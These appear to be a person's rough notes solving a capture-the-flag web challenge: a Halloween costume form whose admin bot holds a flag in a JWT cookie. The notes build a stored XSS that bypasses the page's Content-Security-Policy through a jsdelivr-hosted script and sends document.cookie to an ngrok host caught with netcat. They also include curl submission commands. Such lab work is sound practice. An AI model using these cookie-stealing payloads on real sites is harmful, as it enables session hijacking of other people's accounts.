# web 5 -

Dockerfile - why is it installing chrome?

sent request
`{"halloween_name":"barrett","email":"test@gmail.com","costume_type":"other","trick_or_treat":"treats"}`


`{"halloween_name":"barrett","email":"test@a","costume_type":"Pick one","trick_or_treat":"tricks"}`

JWT,auth middleware
forging jwt ?

volunteer checkbox data not sent?

no sqli, has to be jwt

```sh
# check packages

# nunjucks = templating engine like jinja

npm i
npm audit

# nothing
```

https://github.com/gluckzhang/ctf-jwt-token#background-theory-of-the-exploit


```js
// bot.js
let token = await JWTHelper.sign({ username: 'admin', user_role: 'admin', flag: flag });
		await page.setCookie({
			name: 'session',
			value: token,
			domain: '127.0.0.1:1337'
		});

// on submit, bot.visit() is called
// xss to leak admin cookie from bot 
// ohhhh the admin page lists out all the entries...need to leak cookie or something
// leverage unstrict CSP?

// admin.html
//   {{ request.halloween_name | safe }}
//   {{ request.costume_type }}   // exploit this !
```

```js
// index.js
"Content-Security-Policy",
        "script-src 'self' https://cdn.jsdelivr.net ;

// this looks interesting
```

```sh
# POST http://0.0.0.0:1337/api/submit 
# {"halloween_name":"test","email":"test@gmail.com","costume_type":"spellcaster","trick_or_treat":"treats"}


<script>alert(1)</script

curl --stderr - -H "Content-Type: application/json" --request POST -d \
  '{"halloween_name":"test","email":"test@gmail.com","costume_type":"<img src=\"http://0.0.0.0:8000/hello\"/>","trick_or_treat":"treats"}' http://0.0.0.0:1337/api/submit

curl --stderr - -H "Content-Type: application/json" --request POST -d \
  '{"halloween_name":"test","email":"test@gmail.com","costume_type":"<script>alert(1)</script","trick_or_treat":"treats"}' http://0.0.0.0:1337/api/submit
```

```sh
# disabled auth middleware and name santization for testing
# disabled bot purge all and route auth checks
# name = <script>alert(1)</script>

# costume = <img src="#" onerror="window.location=http://localhost:9000">

curl --stderr - -H "Content-Type: application/json" --request POST -d \
  "{\"halloween_name\":\"test\",\"email\":\"test@gmail.com\",\"costume_type\":\"<img src='#' onerror='window.location=http://localhost:9000'/>\",\"trick_or_treat\":\"treats\"}" http://0.0.0.0:1337/api/submit

# Content Security Policy: The page’s settings blocked the loading of a resource at http://0.0.0.0:1337/favicon.ico (“default-src”).

nc -lnvp 9000
```

```txt
https://www.youtube.com/watch?v=uU_tvQPCBUo
https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d

<img src=1 href=1 onerror="javascript:alert(1)"></img>
<script src="https://cdn.jsdelivr.net/gh/barrettotte/htb-temp@master/payload.js"></script>

complains about no integrity check


https://csp-evaluator.withgoogle.com/

script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'

Host whitelists can frequently be bypassed. Consider using 'strict-dynamic' in combination with CSP nonces or hashes.
Missing object-src allows the injection of plugins which can execute JavaScript. Can you set it to 'none'?


https://www.srihash.org/
<script src="https://cdn.jsdelivr.net/gh/barrettotte/htb-temp@master/payload.js" integrity="sha256-LiztxKv6W4cUMOEsEuYbevH82v1cOvMFxeugyK3mF8w=" crossorigin="anonymous"></script>

<script src="https://cdn.jsdelivr.net/gh/barrettotte/htb-temp@master/payload.js"></script>

<script/src=https://cdn.jsdelivr.net/gh/barrettotte/htb-temp@master/payload.js></script>


<script src="https://cdn.jsdelivr.net/gh/barrettotte/htb-temp@master/payload2.js"></script>

<script src="https://cdn.jsdelivr.net/gh/barrettotte/htb-temp@master/enki.js"></script>

"<img src="#" onerror="alert(1)"/>


DO NOT REMOVE | SAFE PIPE !!!

<script src="https://cdn.jsdelivr.net/gh/CanardMandarin/csp-bypass@master/dist/sval-classic.js"></script><br csp="window.location='http://2a9d-38-92-63-143.ngrok.io/?c='.concat('hello')">


<script src="https://cdn.jsdelivr.net/gh/CanardMandarin/csp-bypass@master/dist/sval-classic.js" crossorigin="anonymous"></script><br csp="fetch('https://2b09-38-92-63-143.ngrok.io/?c='.concat('hello'))">

<script src="https://cdn.jsdelivr.net/gh/CanardMandarin/csp-bypass@master/dist/sval-classic.js"></script><br csp="window.location='http://2a9d-38-92-63-143.ngrok.io/?c='.concat('hello')">


# this one !
<script src="https://cdn.jsdelivr.net/gh/CanardMandarin/csp-bypass@master/dist/sval-classic.js"></script><br csp="fetch('https://0271-38-92-63-143.ngrok.io/?c='.concat(document.cookie),{method:'GET',headers:{'ngrok-skip-browser-warning':'12345'}})">

ngrok http --host-header=rewrite 9000
nc -lvnp 9000

plugged leaked session into cyberchef magic => jwt decode

```



```sh
# https://www.jsdelivr.com/github

# okay we can retrieve xss, but how to retrieve cookie?
# ngrok? https://0xdf.gitlab.io/2020/05/12/ngrok-ftw.html

# ex: fetch("http://7ad3-37-6-59-233.ngrok.io/?c="+document.cookie)
```


